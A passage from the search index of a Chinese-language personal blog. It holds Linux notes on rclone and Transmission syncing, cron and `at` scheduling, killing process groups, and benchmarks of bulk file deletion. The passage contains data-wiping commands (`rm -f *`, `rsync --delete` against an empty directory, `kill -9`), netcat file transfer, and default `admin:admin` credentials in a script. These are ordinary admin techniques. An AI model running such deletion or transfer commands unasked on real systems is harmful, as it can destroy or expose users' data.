下挂载 Google 个人 / 团队云盘 - R 酱小窝 【转载】Rclone: 超好用的网盘 / VPS 数据同步、备份工具，支持 Google Drive | 初行博客 Rclone 进阶使用教程：常用命令参数详解 - P3TERX ZONE - Zhuangbility \u0026 Technology [心得] Rclone Browser教學 - 看板 Free_box - 批踢踢實業坊 Screenly - How to automatically turn off and on your monitor from your Raspberry Pi Raspberry Pi - 超赞合集 awesome list chinese About script torrent done filename · ronggang/transmission-web-control Wiki Scripts · transmission/transmission Wiki LearnHouse » Blog Archive » [Raspberry Pi 3]開機自動掛載 USB 隨身碟或外接硬碟 伺服器架設/防火牆建置 - HackMD CodeIgniter用ChromePHP來debug[PHP] | 敲敲打打的生活 bash wait exit on error code - Stack Overflow Mounting Google Drive on Raspberry Pi - Artur Klauser - Medium Google Drive 相互複製 對拷 – BunnyBit 比特小兔兔 Documentation 限速??待確認 ","date":"2019-10-14","objectID":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/:5:0","tags":["rclone","linux","gdrive"],"title":"rclone 掛載硬碟小記","uri":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"AT 排成設定 2020-07-23 設定時間排程 at Raspberry Pi 預設沒有安裝 sudo apt install at at :time # at -l = atq atq # atrm jobid at now + 5 minutes 中斷結束 Ctrl + D at 04:00 at 04:00 2015-07-30 TIME：時間格式，這裡可以定義出『什麼時候要進行 at 這項工作』的時間，格式有： HH:MM ex\u003e 04:00 在今日的 HH:MM 時刻進行，若該時刻已超過，則明天的 HH:MM 進行此工作。 HH:MM YYYY-MM-DD ex\u003e 04:00 2015-07-30 強制規定在某年某月的某一天的特殊時刻進行該工作！ transmission-remote(1) - Linux man page 開始所有 torrent 下載 transmission-remote --auth=admin:admin -tall --start 停止所有 torrent 下載 transmission-remote --auth=admin:admin -tall --stop 20200808 更新放置路徑可用多重路徑同步 #!/bin/bash DSCORD_WEBHOOK=\"https://discordapp.com/api/webhooks/*\" function sendDiscordNotice(){ local MSG=$2 # echo $MSG local URL=$1 curl -H \"Content-Type: application/json\" \\ -X POST \\ -d \"{\\\"username\\\": \\\"system\\\", \\\"content\\\": \\\"${MSG}\\\"}\" $URL } #sendDiscordNotice $DSCORD_WEBHOOK \"test\" # 需要做同步的路徑，結尾資料夾不用/ LOCAL_SYNCDIR=\"/mnt/extHDD/Download\" # RCLONE 結尾不能有 / RCLONE_SYNCDIR=\"gdrive:/test\" # 注意需要看.config/rclone 資料夾和檔案權限，需要到rx RCLONE_CONFIG_PATH=\"--config=/home/pi/.config/rclone/rclone.conf\" AUTH=\"--auth admin:admin\" REPLATE_PATH=${TR_TORRENT_DIR#\"${LOCAL_SYNCDIR}\"/} #### debug end df -H | grep -vE '^Filesystem|tmpfs|cdrom|udev|已用' | awk '{ print $5 \" \" $1 }' | while read output; do usep=$(echo $output | awk '{ print $1}' | cut -d'%' -f1 ) partition=$(echo $output | awk '{ print $2 }' ) if [ $usep -ge 80 ]; then sendDiscordNotice $DSCORD_WEBHOOK \"⚠️注意快超出硬碟空間\\\\\\\"$partition\\\\\\\" ($usep%) on $(hostname) as on $(date)\" fi done if [[ \"$TR_TORRENT_DIR\" =~ ^\"$LOCAL_SYNCDIR\" ]]; then echo \"pass\" if [ -f \"${TR_TORRENT_DIR}/${TR_TORRENT_NAME}\" ]; then flock -x /tmp/rclone.lock rclone copy ${RCLONE_CONFIG_PATH} \"${TR_TORRENT_DIR}/${TR_TORRENT_NAME}\" \"${RCLONE_SYNCDIR}/${REPLATE_PATH}\" rclone check ${RCLONE_CONFIG_PATH} \"${TR_TORRENT_DIR}/${TR_TORRENT_NAME}\" \"${RCLONE_SYNCDIR}/${REPLATE_PATH}\" else flock -x /tmp/rclone.lock rclone copy ${RCLONE_CONFIG_PATH} \"${TR_TORRENT_DIR}/${TR_TORRENT_NAME}\" \"${RCLONE_SYNCDIR}/${REPLATE_PATH}/${TR_TORRENT_NAME}\" rclone check ${RCLONE_CONFIG_PATH} \"${TR_TORRENT_DIR}/${TR_TORRENT_NAME}\" \"$RCLONE_SYNCDIR/${REPLATE_PATH}/${TR_TORRENT_NAME}\" --size-only fi if [ $? -eq 0 ]; then msg=\"✅ $TR_TORRENT_NAME 完成下載，並完成同步\" echo $msg sendDiscordNotice $DSCORD_WEBHOOK \"$msg\" transmission-remote $AUTH -t $TR_TORRENT_ID --remove-and-delete else echo \"FAIL\" msg=\"⚠️ $TR_TORRENT_NAME 完成下載，但同步失敗\" echo $msg sendDiscordNotice $DSCORD_WEBHOOK \"$msg\" fi else msg=\"✅$TR_TORRENT_NAME 完成下載，不需要做同步\" echo $msg sendDiscordNotice $DSCORD_WEBHOOK \"$msg\" fi ","date":"2019-10-14","objectID":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/:6:0","tags":["rclone","linux","gdrive"],"title":"rclone 掛載硬碟小記","uri":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"最近有一隻排程有時候會卡死 但在想有沒有 crontab 設定方法 網路上爬有爬到解決方法 使用 timeout 指令 使用方法很簡單 timeout 10 ping 127.0.0.1 詳細了解 timeout [選項] 數字[後綴] 命令 [參數]… 後綴」s」代表秒(默認值)，」m」代表分，」h」代表小時，」d」代表天。 選項詳解 長選項必須使用的參數對於短選項時也是必需使用的。 -s, –signal=信號 指定在超時時發送的信號。信號可以是類似\"HUP\"的信號名或是信號數。 查看\"kill -l\"以獲得信號列表 –help 顯示此幫助信息並退出 –version 顯示版本信息並退出 如果程序超時則退出狀態數為124，否則返回程序退出狀態。 如果沒有指定信號則默認為TERM 信號。TERM 信號在進程沒有捕獲此信號時殺死進程。 對於另一些進程可能需要使用KILL (9)信號，當然此信號不能被捕獲。 ———————————————— 版权声明：本文为CSDN博主「Summer_ZJU」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。 原文链接：https://blog.csdn.net/xiaqunfeng123/article/details/54315390 Linux命令——timeout - 夏天的风 - CSDN博客 ","date":"2019-10-05","objectID":"/blog/posts/%E5%9C%A8-Linux-%E8%A8%AD%E5%AE%9A%E6%8E%92%E7%A8%8B%E8%B6%85%E9%81%8E%E5%9F%B7%E8%A1%8C%E6%99%82%E9%96%93-kill-%E6%8E%89%E6%96%B9%E6%B3%95/:0:0","tags":["linux","kill"],"title":"在 Linux 設定排程超過執行時間 kill 掉方法","uri":"/blog/posts/%E5%9C%A8-Linux-%E8%A8%AD%E5%AE%9A%E6%8E%92%E7%A8%8B%E8%B6%85%E9%81%8E%E5%9F%B7%E8%A1%8C%E6%99%82%E9%96%93-kill-%E6%8E%89%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"子程序 kill 探討 我好奇子程序會不會關掉如何在 Linux 殺掉(kill)子程序 | 程式狂想筆記 自從上次紀錄 我好奇子程序會不會關掉?? 經過實驗結果會 但很奇怪我好奇他怎麼會 kill 掉 子程序 經過我猜測，背景應該是使用kill -- -$PGID指令 所以子程序才會關掉 ","date":"2019-10-05","objectID":"/blog/posts/%E5%9C%A8-Linux-%E8%A8%AD%E5%AE%9A%E6%8E%92%E7%A8%8B%E8%B6%85%E9%81%8E%E5%9F%B7%E8%A1%8C%E6%99%82%E9%96%93-kill-%E6%8E%89%E6%96%B9%E6%B3%95/:1:0","tags":["linux","kill"],"title":"在 Linux 設定排程超過執行時間 kill 掉方法","uri":"/blog/posts/%E5%9C%A8-Linux-%E8%A8%AD%E5%AE%9A%E6%8E%92%E7%A8%8B%E8%B6%85%E9%81%8E%E5%9F%B7%E8%A1%8C%E6%99%82%E9%96%93-kill-%E6%8E%89%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"其他小記 ","date":"2019-10-05","objectID":"/blog/posts/%E5%9C%A8-Linux-%E8%A8%AD%E5%AE%9A%E6%8E%92%E7%A8%8B%E8%B6%85%E9%81%8E%E5%9F%B7%E8%A1%8C%E6%99%82%E9%96%93-kill-%E6%8E%89%E6%96%B9%E6%B3%95/:2:0","tags":["linux","kill"],"title":"在 Linux 設定排程超過執行時間 kill 掉方法","uri":"/blog/posts/%E5%9C%A8-Linux-%E8%A8%AD%E5%AE%9A%E6%8E%92%E7%A8%8B%E8%B6%85%E9%81%8E%E5%9F%B7%E8%A1%8C%E6%99%82%E9%96%93-kill-%E6%8E%89%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"安裝timeout指令 安裝timeout指令(通常沒例外的時候，Linux應該會有) coreutils timeout –\u003e command not found in linux server - Stack Overflow ","date":"2019-10-05","objectID":"/blog/posts/%E5%9C%A8-Linux-%E8%A8%AD%E5%AE%9A%E6%8E%92%E7%A8%8B%E8%B6%85%E9%81%8E%E5%9F%B7%E8%A1%8C%E6%99%82%E9%96%93-kill-%E6%8E%89%E6%96%B9%E6%B3%95/:2:1","tags":["linux","kill"],"title":"在 Linux 設定排程超過執行時間 kill 掉方法","uri":"/blog/posts/%E5%9C%A8-Linux-%E8%A8%AD%E5%AE%9A%E6%8E%92%E7%A8%8B%E8%B6%85%E9%81%8E%E5%9F%B7%E8%A1%8C%E6%99%82%E9%96%93-kill-%E6%8E%89%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"kill -2 就使 Ctrl + c 這一樣子程序都會被 kill 掉 ","date":"2019-10-05","objectID":"/blog/posts/%E5%9C%A8-Linux-%E8%A8%AD%E5%AE%9A%E6%8E%92%E7%A8%8B%E8%B6%85%E9%81%8E%E5%9F%B7%E8%A1%8C%E6%99%82%E9%96%93-kill-%E6%8E%89%E6%96%B9%E6%B3%95/:2:2","tags":["linux","kill"],"title":"在 Linux 設定排程超過執行時間 kill 掉方法","uri":"/blog/posts/%E5%9C%A8-Linux-%E8%A8%AD%E5%AE%9A%E6%8E%92%E7%A8%8B%E8%B6%85%E9%81%8E%E5%9F%B7%E8%A1%8C%E6%99%82%E9%96%93-kill-%E6%8E%89%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"nohup意思 有關 nohup nohup 的全寫是 “no hangup”, HUP hangup (HUP) 訊號會在使用者登出時, 系統向 process 發出, 通知 process 結束, 但透過 nohup 執行的指令, nohup 會將 HUP 訊息截取, 讓指令可以繼續執行。 nohup 指令 - 背景執行指令 掛起信號【hang up】，終端斷線，經常在退出系統前使用，會終止進程。但是，一般啟動程序時為了讓程序繼續運行，會指定 nohup 就是為了不讓程序接收掛起信號而終止，這樣在退出系統時程序仍舊能正常運行 Linux 之 kill 命令入門實踐 | 蝦丸派 參考連結: Ways to kill parent and child processes in one command - Fibrevillage Linux 中 Kill -2 和 Kill -9 的区别 - Harry的专栏 - CSDN博客 Linux中kill -2、kill -9等区别 \u0026\u0026 kill signal汇总 - 天涯的浪子 - CSDN博客 Linux 之 kill 命令入门实践 | 虾丸派 Linux kill -9 和 kill -15 的区别 - 妖老山黑 - 博客园 process - ps switches to display PID, PPID, PGID, and SID collectively - Unix \u0026 Linux Stack Exchange kill -HUP pid - 小菜鸟的天地 - CSDN博客 Linux命令——timeout - 夏天的风 - CSDN博客 Running php script as cron job - timeout issues? - Stack Overflow ","date":"2019-10-05","objectID":"/blog/posts/%E5%9C%A8-Linux-%E8%A8%AD%E5%AE%9A%E6%8E%92%E7%A8%8B%E8%B6%85%E9%81%8E%E5%9F%B7%E8%A1%8C%E6%99%82%E9%96%93-kill-%E6%8E%89%E6%96%B9%E6%B3%95/:2:3","tags":["linux","kill"],"title":"在 Linux 設定排程超過執行時間 kill 掉方法","uri":"/blog/posts/%E5%9C%A8-Linux-%E8%A8%AD%E5%AE%9A%E6%8E%92%E7%A8%8B%E8%B6%85%E9%81%8E%E5%9F%B7%E8%A1%8C%E6%99%82%E9%96%93-kill-%E6%8E%89%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"最近有排程卡住 MIS 殺掉(kill)程式，發現他的子程序還在跑 我們都以為 kill 掉父程序就可以關掉子程序 今天實驗出來是不能的 2021 沒想到這篇 Google 還滿容易搜尋到 當初只是操作筆記，簡單紀錄 不過有部分寫錯，把多餘錯誤份刪掉 留下重點…避免其他人吸收錯誤知識 ","date":"2019-10-03","objectID":"/blog/posts/%E5%A6%82%E4%BD%95%E5%9C%A8-Linux-%E6%AE%BA%E6%8E%89-kill-%E5%AD%90%E7%A8%8B%E5%BA%8F/:0:0","tags":["kill","pkill"],"title":"如何在 Linux 殺掉(kill)子程序","uri":"/blog/posts/%E5%A6%82%E4%BD%95%E5%9C%A8-Linux-%E6%AE%BA%E6%8E%89-kill-%E5%AD%90%E7%A8%8B%E5%BA%8F/"},{"categories":["Linux"],"content":"什麼是子程序 可以先去鳥哥那邊了解子程序運作原理 簡單說目前看到有兩種 父程序呼叫子程序，父程序會掛起(類似stop)，不會做任何動作，等子程序跑完才會往下執行 PS: 剛好最近了解阻塞跟非阻塞，這應該就是阻塞 fork and exec：程序呼叫的流程(可參考:鳥哥的 Linux 私房菜 – 第十六章、程序管理與 SELinux 初探，我目前還沒深入研究) ","date":"2019-10-03","objectID":"/blog/posts/%E5%A6%82%E4%BD%95%E5%9C%A8-Linux-%E6%AE%BA%E6%8E%89-kill-%E5%AD%90%E7%A8%8B%E5%BA%8F/:1:0","tags":["kill","pkill"],"title":"如何在 Linux 殺掉(kill)子程序","uri":"/blog/posts/%E5%A6%82%E4%BD%95%E5%9C%A8-Linux-%E6%AE%BA%E6%8E%89-kill-%E5%AD%90%E7%A8%8B%E5%BA%8F/"},{"categories":["Linux"],"content":"kill 父程序實驗 只要在 kill -$PGID 只要在 kill -$PGID 只要在 kill -$PGID kill -$PID 其實下面我之前引用英文文章有寫到 這邊我之前測試，使用 Ctrl + C 想說就是 kill -2 xxx 但我阿現實作跟 kill 有差異`，我測試結果子程序會刪除 這邊就不深入探討了… Linux ctrl-c explained(ctrl-c 详解) - SegmentFault 思否 2019-10-05 原來我誤會了 其實 kill 也能殺掉子程序 在研究 timeout 指令，實驗子程序狀況發現子程序也會關掉 這又是另外一個事情了 推薦使用下面第二點方法去 kill 掉 # 下面兩個寫法一樣 # 另外 $PGID 可解讀就是父層可以被 PID kill -- -$PGID kill -15 -$PGID # 當然也可以強制關閉 kill -9 -$PGID PGID 也可以用 ps 指令去查 process - ps switches to display PID, PPID, PGID, and SID collectively - Unix \u0026 Linux Stack Exchange 2020-11-26 最近用碰觸 kill 忘記一般 kill 要加負號才能刪掉子程序 最近也在探討 nohup 和 \u0026 也能不能做尋組刪除 答案是可以的 可以參考: [譯] 如何殺死一個進程和它的所有子進程 備份圖 最近想做一個守護進程… 再研究… 參考連結: 1.kill a group of processes with negative PID(Process ID) kill -TERM -PID Is to kill PID and all its child processes. 2. kill a group of processes with their PGID(Process Group ID) kill – -$PGID Kill using the default signal (TERM = 15) kill -9 -$PGID Kill using the KILL signal (9) kill a group processes with only PID info kill – -$(ps -o pgid= $PID | grep -o [0-9]*) Actually, you may notice that it’s just the way from #2 4.Using pkill, kill processes by PGID(Proess Group ID) pkill -9 -g $PGID 5.Using pkill, kill processes by GID(Group ID) pkill -9 -G $GID 6.Using pkill, kill processes by PPID(Parent Process ID) pkill -9 -p $PPID 7.Using pkill, kill processes by terminal pkill -9 -t $terminal Note: without /dev/ prefix 8.Using pkill, kill processes by process name pkill -9 -x $process_name 9.Using pkill, kill processes by session pkill -9 -s $sess How to get PID,PGID,sessionid etc? # ps -o pid,ppid,pgid,gid,sess,cmd -U root PID PPID PGID GID SESS CMD Ways to kill parent and child processes in one command - Fibrevillage 鳥哥的 Linux 私房菜 – 第十六章、程序管理與 SELinux 初探 linux - Best way to kill the all child processes in Linux - By Microsoft Award MVP - ubuntu - red hat - debian - linux server - linux pc - Learn in 30sec | wikitechy （三）进程各种id：pid、pgid、sid、全局pid、局部pid - win9 - CSDN博客 阿旺的 Linux 開竅手冊-process 進程(行程/程序) process - Kill all descendant processes - Unix \u0026 Linux Stack Exchange 阿旺的 Linux 開竅手冊-process 進程(行程/程序) 子进程及时知道父进程已经退出的最简单方案 - 横云断岭的专栏 - CSDN博客 ","date":"2019-10-03","objectID":"/blog/posts/%E5%A6%82%E4%BD%95%E5%9C%A8-Linux-%E6%AE%BA%E6%8E%89-kill-%E5%AD%90%E7%A8%8B%E5%BA%8F/:2:0","tags":["kill","pkill"],"title":"如何在 Linux 殺掉(kill)子程序","uri":"/blog/posts/%E5%A6%82%E4%BD%95%E5%9C%A8-Linux-%E6%AE%BA%E6%8E%89-kill-%E5%AD%90%E7%A8%8B%E5%BA%8F/"},{"categories":["Markdown"],"content":"小記我常忘 markdown 循序圖 循序圖 战士-\u003e领导: 首长好 Note right of 领导: 首长复杂的内心活动 领导--\u003e战士: 同志们好 战士-\u003e\u003e领导: 为人民服务 對象箭頭標識符： -\u003e: 表示實線實箭頭 (同步) --\u003e: 表示虛線實箭頭 兩個--回復 -\u003e\u003e: 表示實線虛箭頭(非同步) --\u003e\u003e：表示虛線虛箭頭 【UML 建模】UML入门 之 交互图 – 时序图 协作图详解 - 让 学习 成为一种 习惯 ( 韩曙亮 の 技术博客 ) - CSDN博客 Markdown 時序圖/序列圖 - 開發者目錄 UML 图中的消息 --\u003e 程式返回值使用，如上面範例 ","date":"2019-10-01","objectID":"/blog/posts/%E7%94%A8-Markdown-%E7%95%AB%E5%BE%AA%E5%BA%8F%E5%9C%96%E5%B0%8F%E8%A8%98/:0:0","tags":["markdown"],"title":"用 Markdown 畫循序圖小記","uri":"/blog/posts/%E7%94%A8-Markdown-%E7%95%AB%E5%BE%AA%E5%BA%8F%E5%9C%96%E5%B0%8F%E8%A8%98/"},{"categories":["程式心法"],"content":"最近發現串接的 API 有這種格式\"P3Y6M4DT12H30M5S\" 第一次看到這種好奇是什麼東西 發現是一個標準格式 ISO 8601 duration PnYnMnDTnHnMnS PnW P\u003cdate\u003eT\u003ctime\u003e “P3Y6M4DT12H30M5S” 就表示 “3年6個月4天12小時又30分5秒”， 看這麼一連串字，覺得很難看到 但其實舊時一個英文搭配數字組合方式 ","date":"2019-10-01","objectID":"/blog/posts/ISO-8601-duration-%E6%99%82%E9%96%93%E6%A8%99%E6%BA%96%E5%B0%8F%E8%A8%98/:0:0","tags":["duration"],"title":"ISO 8601 duration 時間標準小記","uri":"/blog/posts/ISO-8601-duration-%E6%99%82%E9%96%93%E6%A8%99%E6%BA%96%E5%B0%8F%E8%A8%98/"},{"categories":["程式心法"],"content":"現成 Library ","date":"2019-10-01","objectID":"/blog/posts/ISO-8601-duration-%E6%99%82%E9%96%93%E6%A8%99%E6%BA%96%E5%B0%8F%E8%A8%98/:1:0","tags":["duration"],"title":"ISO 8601 duration 時間標準小記","uri":"/blog/posts/ISO-8601-duration-%E6%99%82%E9%96%93%E6%A8%99%E6%BA%96%E5%B0%8F%E8%A8%98/"},{"categories":["程式心法"],"content":"momentjs Moment.js | Docs moment.duration('P3Y6M4DT12H30M5S','minutes').toString(); \"P3Y6M4DT12H30M5S\" moment.duration('P3Y6M4DT12H30M5S','minutes').humanize() \"4 years\" moment.duration('P3Y6M4DT12H30M5S','minutes').minutes() 30 moment.duration('P3Y6M4DT12H30M5S','minutes').as('hours') 30780.50138888889 moment.duration('P3Y6M4DT12H30M5S','minutes').toISOString() \"P3Y6M4DT12H30M5S\" Duration missing features · Issue #463 · moment/moment 換成好看的時間 moment.utc(moment.duration('P3Y6M4DT12H30M5S').asMilliseconds()).format(\"HH:mm\"); Format a moment duration as Hours and Minutes · TCS Blog ","date":"2019-10-01","objectID":"/blog/posts/ISO-8601-duration-%E6%99%82%E9%96%93%E6%A8%99%E6%BA%96%E5%B0%8F%E8%A8%98/:1:1","tags":["duration"],"title":"ISO 8601 duration 時間標準小記","uri":"/blog/posts/ISO-8601-duration-%E6%99%82%E9%96%93%E6%A8%99%E6%BA%96%E5%B0%8F%E8%A8%98/"},{"categories":["程式心法"],"content":"Java java.time.Duration 生活記事簿: Parse ISO 8601 duration 的方法 ","date":"2019-10-01","objectID":"/blog/posts/ISO-8601-duration-%E6%99%82%E9%96%93%E6%A8%99%E6%BA%96%E5%B0%8F%E8%A8%98/:1:2","tags":["duration"],"title":"ISO 8601 duration 時間標準小記","uri":"/blog/posts/ISO-8601-duration-%E6%99%82%E9%96%93%E6%A8%99%E6%BA%96%E5%B0%8F%E8%A8%98/"},{"categories":["程式心法"],"content":"PHP PHP: DateInterval::__construct - Manual \u003c?php $interval = new DateInterval('P2Y4DT6H8M'); var_dump($interval); PHP: DateInterval::format - Manual 另外 DB 要怎麼紀錄這種資料呢? What MySQL datatype to store a PHP DateInterval - Stack Overflow 這邊裡面有提到用 varchar 但我覺得存 int 會比較好 先記錄到這邊，有發現好用的在紀錄 ","date":"2019-10-01","objectID":"/blog/posts/ISO-8601-duration-%E6%99%82%E9%96%93%E6%A8%99%E6%BA%96%E5%B0%8F%E8%A8%98/:1:3","tags":["duration"],"title":"ISO 8601 duration 時間標準小記","uri":"/blog/posts/ISO-8601-duration-%E6%99%82%E9%96%93%E6%A8%99%E6%BA%96%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"今天在大量檔案資料夾(約19萬個檔案) 下 command line 下 ls 之後就卡住 不能用 Ctrl + C 跳出去… 在想有什麼方法解決這個問題? ","date":"2019-09-27","objectID":"/blog/posts/Linux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:0:0","tags":["ls","linux"],"title":"Linux ls 大量檔案卡住解決方法","uri":"/blog/posts/Linux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"ls -1 -f 注意這邊 -1 是數字1，不是英文小寫L 查看了一下 -f 就是不做排序，-1是做一欄輸出 Linux下文件过多过碎问题 – 工作笔记 ","date":"2019-09-27","objectID":"/blog/posts/Linux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:1:0","tags":["ls","linux"],"title":"Linux ls 大量檔案卡住解決方法","uri":"/blog/posts/Linux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"刪除多個檔案 雖然我沒有現在要做，不過都看到方法，順便記錄一下。 ","date":"2019-09-27","objectID":"/blog/posts/Linux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:2:0","tags":["ls","linux"],"title":"Linux ls 大量檔案卡住解決方法","uri":"/blog/posts/Linux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"strace 這篇用非常大的文件夹导致ls命令卡住 strace 方法 ls -l \u003e/dev/null strace -p 3963 2\u003e\u00261 | grep lstat # lstat64(“xxxxx”, {st_mode=S_IFREG|0664, st_size=0, …}) = 0 Linux 删除海量文件 rm -f 会卡死怎么破？ - OSCHINA ","date":"2019-09-27","objectID":"/blog/posts/Linux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:2:1","tags":["ls","linux"],"title":"Linux ls 大量檔案卡住解決方法","uri":"/blog/posts/Linux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"rsync –delete-before rsync –delete-before -d -a –progress –stats /a/ /data/ Linux下文件过多过碎问题 – 工作笔记 还是Linux删除海量文件的问题，那些说用rsync –delete-before完全没用 - OSCHINA ","date":"2019-09-27","objectID":"/blog/posts/Linux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:2:2","tags":["ls","linux"],"title":"Linux ls 大量檔案卡住解決方法","uri":"/blog/posts/Linux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"別人多個測試結果 http://www.slashroot.in/which-is-the-fastest-method-to-delete-files-in-linux 刪除50萬個文件,各種方法的速度對比: 先創建50萬個文件: for i in $(seq 1 500000); do echo testing » $i.txt; done 各種刪除當前目錄文件方法,先進入該目錄(比如PHP的sessions目錄),然後執行以下命令: time rm -f * 刪除失敗,返回 /bin/rm: Argument list too long time find ./ -type f -exec rm {} ; time find ./ -type f -delete time rsync -a –delete EmptyDir/ BigDir/ time perl -e ‘for(\u003c*\u003e){((stat)9\u003c(unlink))}’ 結果: perl用了1分鐘 rsync用了3分鐘 find with -delete用了5分鐘 find with -exec用了14分鐘 直接用rm結果是刪除失敗. ","date":"2019-09-27","objectID":"/blog/posts/Linux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:2:3","tags":["ls","linux"],"title":"Linux ls 大量檔案卡住解決方法","uri":"/blog/posts/Linux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"實測 # 建立 500000 測試文件 for i in $(seq 1 500000); do echo testing \u003e\u003e $i.txt; done find /test -type f -exec rm {} \\; find /test -mtime +7 -exec rm {} \\; find /test -size +7M -exec rm {} \\; time rm -f * #/bin/rm: Argument list too long time find ./ -type f -exec rm {} \\; #real 14m51.735s time find ./ -type f -delete # real 5m11.937s time perl -e 'for(\u003c*\u003e){((stat)[9]\u003c(unlink))}' # real 1m0.488s (王者) time rsync -a --delete blanktest/ test/ # real 2m52.502s 測試 Perl 真的很快，不知道是用甚麼巫術。 推薦詳細可以看Rsync同步时删除多余文件 [附：删除大量文件方法的效率对比] - 散尽浮华 - 博客园 備份圖 裡面介紹很詳細 # #1 刪除某資料夾檔案 #1）建立一個空的文件夾： # mkdir /tmp/test #2）用rsync刪除目標目錄： # rsync --delete-before -a -H -v --progress --stats /tmp/test/ log/ 這樣要刪除的log目錄就會被清空了，刪除的速度會非常快。rsync實際上用的是替換原理，處理數十萬個文件也是秒刪。 # #2 刪除某資料夾檔案 # 搬移後刪除 rsync -a --remove-source-files SOURCEDIR /mnt/TARGETDIR/ Linux 刪除海量文件 rm -f 會卡死怎麼破？ - OSCHINA ","date":"2019-09-27","objectID":"/blog/posts/Linux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:2:4","tags":["ls","linux"],"title":"Linux ls 大量檔案卡住解決方法","uri":"/blog/posts/Linux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"大量檔案複製 3、小文件太多，複製太慢 1，在需要對大量小文件進行移動或複製時，用cp、mv都會顯得很沒有效率，可以用tar先壓縮再解壓縮的方式。 2，在網絡環境中傳輸時，可以再結合nc命令，通過管道和tcp端口進行傳輸。 nc和tar可以用來快速的在兩台機器之間傳輸文件和目錄，比ftp和scp要來得簡單的多。 由於nc是一個超輕量的命令，所以一般busybox都會集成它。當一個linux終端，比如linux pda, 通過usblan的方式連接到另一台linux主機的時候，這樣的嵌入式終端上一般不會集成ftp server, ssh server 這樣比較笨重的服務，這個時候， nc可能成為唯一的上傳手段。 比如將機器A上的test目錄上傳到到機器 B（192.168.0.11）上，只需要： 在機器B上，用nc來監聽一個端口，隨便就好，只要不被佔用；並且將收到的數據用tar展開。-l代表監聽模式。 #nc -l 4444 |tar -C /tmp/dir -zxf - 然後，在A上通過nc和 tar發送test目錄。使用一致的4444的端口。 #tar -zcvf - test|nc 192.168.0.11 4444 Linux下文件過多過碎問題 – 工作筆記 哪天用到再說… ","date":"2019-09-27","objectID":"/blog/posts/Linux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:3:0","tags":["ls","linux"],"title":"Linux ls 大量檔案卡住解決方法","uri":"/blog/posts/Linux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"實測 最近工作有座大量刪除檔案，在我還滿好奇使用這個速度會有多快?上面指令竟然無法使用!!!不過後來有找到類似指令，最後測試成功。 參考: Netcat（Linux nc 指令）網路管理者工具實用範例| 兩台主機之間複製整個目錄 - G. T. Wang 下面操作要照順序 在接收端電腦使用 nc -l 5000 | tar xvf - 在發送端電腦使用 # localhost 換成你的目地電腦 # 